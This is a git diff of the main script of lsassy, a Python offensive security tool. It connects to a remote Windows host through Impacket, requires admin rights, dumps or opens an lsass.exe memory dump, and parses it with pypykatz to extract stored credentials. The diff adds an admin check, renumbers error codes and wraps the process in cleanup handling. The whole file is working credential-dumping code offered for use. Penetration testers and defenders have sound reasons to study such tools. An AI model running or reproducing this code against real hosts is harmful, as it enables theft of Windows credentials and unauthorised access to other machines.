@@ -1,18 +1,20 @@
 #!/usr/bin/env python3
-#
 # Author:
 #  Romain Bentz (pixis - @hackanddo)
 # Website:
-#  https://beta.hackndo.com
+#  https://beta.hackndo.com [FR]
+#  https://en.hackndo.com [EN]
+
+import sys
 
 import pkg_resources
-import sys
 from pypykatz.pypykatz import pypykatz
+
+from lsassy.dumper import Dumper
 from lsassy.impacketconnection import ImpacketConnection
 from lsassy.impacketfile import ImpacketFile
-from lsassy.parser import Parser
-from lsassy.dumper import Dumper
 from lsassy.log import Logger
+from lsassy.parser import Parser
 
 version = pkg_resources.require("lsassy")[0].version
 
@@ -82,35 +84,49 @@ def run():
     try:
         conn = ImpacketConnection.from_args(args, logger)
     except Exception as e:
-        logger.error("Connexion refused")
+        logger.error("Connexion error")
         logger.debug("Error : {}".format(e))
         return 2
 
-    dumper = None
-    if not args.dumppath:
-        dumper = Dumper(conn, args, logger)
-        ifile = dumper.dump()
-        if not ifile:
-            logger.error("Process lsass.exe could not be dumped")
-            return 3
-        logger.success("Process lsass.exe has been dumped")
-    else:
-        ifile = ImpacketFile(conn, logger)
-        try:
-            ifile.open(args.dumppath)
-        except Exception as e:
-            logger.error("lsass dump file does not exist. Use --debug flag for more details")
-            logger.debug("Error : {}".format(str(e)))
-            return 4
-    dumpfile = pypykatz.parse_minidump_external(ifile)
-    ifile.close()
-    parser = Parser(dumpfile, logger)
-    parser.output(args)
+    if not conn.isadmin():
+        logger.error("Administrative rights on remote host are required")
+        return 3
 
-    if dumper is not None:
-        dumper.clean()
-    conn.close()
-    return 0
+    dumper = None
+    ifile = None
+    try:
+        if not args.dumppath:
+            dumper = Dumper(conn, args, logger)
+            ifile = dumper.dump()
+            if not ifile:
+                logger.error("Process lsass.exe could not be dumped")
+                return 4
+            logger.success("Process lsass.exe has been dumped")
+        else:
+            ifile = ImpacketFile(conn, logger)
+            try:
+                ifile.open(args.dumppath)
+            except Exception as e:
+                logger.error("lsass dump file does not exist. Use --debug flag for more details")
+                logger.debug("Error : {}".format(str(e)))
+                return 5
+        dumpfile = pypykatz.parse_minidump_external(ifile)
+        ifile.close()
+        parser = Parser(dumpfile, logger)
+        parser.output(args)
+    except KeyboardInterrupt as e:
+        print("\nQuitting gracefully...")
+    except Exception as e:
+        pass
+    finally:
+        try:
+            ifile.close()
+        except Exception as e:
+            pass
+        if dumper is not None:
+            dumper.clean()
+        conn.close()
+        sys.exit(0)
 
 
 if __name__ == '__main__':
